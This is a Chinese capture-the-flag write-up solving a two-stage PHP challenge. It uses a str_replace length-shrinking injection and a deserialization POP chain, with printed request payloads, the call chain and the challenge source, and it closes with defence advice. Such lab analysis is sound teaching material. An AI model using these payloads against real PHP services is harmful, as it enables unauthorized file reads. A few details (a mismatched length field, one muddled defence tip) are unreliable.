# 数字古墓 — ISCC 2025 Web 题解

| 字段 | 内容 |
|------|------|
| 题目 | 数字古墓 |
| 分值 | 150 |
| 作者 | admin |
|  solves | 2792 |
| 目标 | `http://39.105.213.28:10026` |
| 考点 | PHP `str_replace` 长度陷阱 + PHP 反序列化 POP 链 |

---

## 题目描述

> 在被遗忘的数字荒原深处，沉睡着一座古老的"序列陵墓"。
> 前殿守着能够吞噬字符的"文字陷阱"，后殿则由一连串会自行苏醒的"对象守卫"看守。
> 只有能读懂变量铭文、操纵机关链条的探索者，才能解开陵墓的终极封印。

---

## 信息收集

首页提供两个入口：

- **`rune_trial.php`** — "符文试炼"（第一关）
- **`mechanism_chamber.php`** — "觉醒机关"（第二关）

两页均通过 `highlight_file(__FILE__)` 直接输出 PHP 源码，属于**白盒审计**。

---

## 第一关：符文试炼（`rune_trial.php`）

### 源码分析

```php
class nameA {
    public $x;
    public $y;
    public function __wakeup() {
        if ($this->y === 'admin123') {
            include('relic_manifest.php');
            echo "成功！文件名: " . $filename;
        }
    }
}

function p2($i) {
    $key = "bnhpjowd";
    for ($j = 0; $j < strlen($key); $j++) {
        $search .= chr(ord($key[$j]) - 1);
    }
    return str_replace($search, 'iscc', $i);
}

$obj = new nameA($input, $passwd);
$ser = serialize($obj);
$result = p1($ser);
unserialize($result);
```

关键逻辑：
1. `$input` 和 `$passwd` 来自 GET 参数 `d` 和 `p`
2. 创建 `nameA($input, $passwd)` → `$x = $input`，`$y = $passwd`
3. 序列化后经过 `p1` → `p2`，其中做了一次 `str_replace`
4. `str_replace` 的结果传给 `unserialize()`
5. 反序列化触发 `__wakeup()`，要求 `$y === 'admin123'`

### 漏洞点：`str_replace` 长度不对称

`"bnhpjowd"` 每个字符 ASCII 减 1：

```
b→a, n→m, h→g, p→o, j→i, o→n, w→v, d→c
→ "amgoinvc"
```

所以 p2 做的实际是：
```php
str_replace("amgoinvc", "iscc", $ser)
```

**`amgoinvc` 长 8 字节，`iscc` 长 4 字节**。替换后序列化字符串变短，但**长度字段 `s:N:` 中的 N 不会同步更新**，导致 `unserialize()` 按旧的长度读取，发生错位解析。

### 利用思路

利用这个长度差，在可控属性 `$x` 中填入 `amgoinvc` 的重复，使其在替换后"缩短"，再用注入的字符串控制后续属性的解析。

**构造：**

| 参数 | 值 |
|------|-----|
| `d` | `amgoinvcamgoinvcamgoinvcamgoinvc` (4 次重复 = 32 字节) |
| `p` | `";s:1:"y";s:8:"admin123";}` |

**序列化后的原始字符串（简化）：**
```
O:5:"nameA":2:{s:1:"x";s:32:"amgoinvcamgoinvcamgoinvcamgoinvc";s:1:"y";s:30:"";s:1:"y";s:8:"admin123";}";}
```

**经过 4 次替换后：**
```
O:5:"nameA":2:{s:1:"x";s:32:"iscciscciscciscc";s:1:"y";s:30:"";s:1:"y";s:8:"admin123";}";}
```

- `x` 字段声明长度为 32，但实际内容只剩 16 字节
- `unserialize` 读取 32 字节时，会吞掉后面 16 字节的内容
- 从 `s:1:"y";s:30:""` 开始被错位吞掉
- 后续的 `s:1:"y";s:8:"admin123";}` 被解析为 `y = "admin123"`

于是 `__wakeup()` 条件满足，`include('relic_manifest.php')` 被执行，页面输出类似：

```
成功！文件名: W3f82KD9.txt
```

这个 `.txt` 文件名就是第二关要读取的目标。

### 第一关 Payload

```
GET /rune_trial.php?d=amgoinvcamgoinvcamgoinvcamgoinvc&p=%22%3Bs%3A1%3A%22y%22%3Bs%3A8%3A%22admin123%22%3B%7D
```

---

## 第二关：觉醒机关（`mechanism_chamber.php`）

### 源码分析

第二关定义了 5 个类，通过 `unserialize($_POST['data'], ['allowed_classes' => [...]])` 接收输入，只允许列表中指定的类被反序列化。

**关键类：**

```php
class RitualEngine {
    protected $settings;
    public $target;
    public $callback;

    public function run($file = null) {
        $name = $file ?: $this->target;
        if (!preg_match('/^[A-Za-z0-9_-]+\.txt$/', $name)) return;
        $path = __DIR__ . DIRECTORY_SEPARATOR . $name;
        $real = realpath($path);
        // 检查路径在 __DIR__ 下，限制文件 < 2048 字节
        highlight_file($real);
    }

    public function __invoke() {
        $action = @unserialize($this->callback);
        [$obj, $method] = $action;
        // 要求 $obj 必须是 RitualEngine 实例
        $map = ['view' => 'run'];
        $real = $map[$method];
        $obj->$real();  // 调用 $obj->run()
    }
}

class GateSentinel {
    public $object;
    public $tool;

    public function __toString() {
        if (isset($this->tool['blade'])) {
            $this->tool['blade']->object;  // 访问不存在的属性 → __get
        }
        return "GateSentinel";
    }

    public function __wakeup() {
        if (preg_match("/\.\.|flag|etc/i", $this->object)) {
            $this->object = "index.html";  // 黑名单过滤
        }
    }
}

class Keystone {
    public $center;

    public function __get($name) {
        $processor = $this->center;
        if (!is_object($processor)) return null;
        // 只允许 5 个特定类
        $safe = ['RitualEngine','GateSentinel','RuneScribe','Chronicler','Keystone'];
        if (!in_array(get_class($processor), $safe, true)) return null;
        if (is_callable($processor)) {
            return $processor();  // 触发 __invoke
        }
    }
}
```

### 漏洞点：POP 链构造

**`__wakeup()` 过滤绕过：**  
黑名单检查 `$this->object` 是否包含 `..`、`flag`、`etc`。  
将外层 `GateSentinel::$object` 设置为另一个对象（不含敏感字符串），真正文件名隐藏在内层 `RitualEngine::$target` 中。

注意 `preg_match` 的第一个参数会被自动转为字符串——这正是触发点。

**完整调用链：**

```
GateSentinel::__wakeup()
  → preg_match("/\.\.|flag|etc/i", $this->object)
  → $this->object 是对象，自动调用 __toString()
  → GateSentinel::__toString()
    → $this->tool['blade']->object
    → 访问 Keystone 不存在的 object 属性
    → Keystone::__get('object')
      → $processor = $this->center  (一个 RitualEngine 对象)
      → is_callable($processor) → true (有 __invoke)
      → $processor()
      → RitualEngine::__invoke()
        → unserialize($this->callback)
        → [$reader, 'view']
        → $map['view'] = 'run'
        → $reader->run()
          → $name = $reader->target = "W3f82KD9.txt"
          → highlight_file(__DIR__ . "/W3f82KD9.txt")
```

**`run()` 的安全检查：**  
- 文件名必须匹配 `/^[A-Za-z0-9_-]+\.txt$/`  
- 路径必须在 `__DIR__` 下（通过 `realpath` + `strpos` 检查）  
- 文件必须小于 2048 字节  

第一关返回的文件名天然满足这些条件，因此可以直接读取。

### 第二关 Payload

构造的嵌套对象结构：

```
GateSentinel {
  object → GateSentinel {
    object → null
    tool → { blade → Keystone { center → RitualEngine {
      settings → null
      target → "W3f82KD9.txt"
      callback → 序列化后的 ["<RitualEngine>", "view"]
    }}}
  }
  tool → null
}
```

POST 请求：

```
POST /mechanism_chamber.php
Content-Type: application/x-www-form-urlencoded

data=O:12:"GateSentinel":2:{...}
```

响应中包含 `highlight_file()` 输出的文件内容：

```
ISCC{ankh_rune_sigma_47x_decrypted}
```

> 注意：flag 是动态轮换的，每次请求获取的值不同。

---

## 总结

| 关卡 | 漏洞类型 | 关键绕过点 |
|------|----------|-----------|
| 符文试炼 | `str_replace` 长度陷阱 → 反序列化字符串错位 | 利用 8→4 字节替换造成长度差，注入伪造属性 |
| 觉醒机关 | PHP 原生反序列化 POP 链 | 用嵌套对象绕过 `__wakeup` 黑名单，通过 `__toString` → `__get` → `__invoke` 触发文件读取 |

**防御建议：**
1. `str_replace` 后不应直接 `unserialize`，应先验证序列化结构的完整性
2. 反序列化时应禁用 `allowed_classes`，或只允许无魔术方法的类
3. `preg_match` 参数强制字符串转换可能触发意外 `__toString`，应显式 `(string)` 转换或先检查类型

---

## 参考脚本

见 [数字古墓exp.py](./数字古墓exp.py)，用法：

```bash
pip install requests
python 数字古墓exp.py
```

输出示例：
```
[+] stage1 filename: W3f82KD9.txt
[+] flag: ISCC{xxxxxxxxxxxxxxxxxxxx}
```
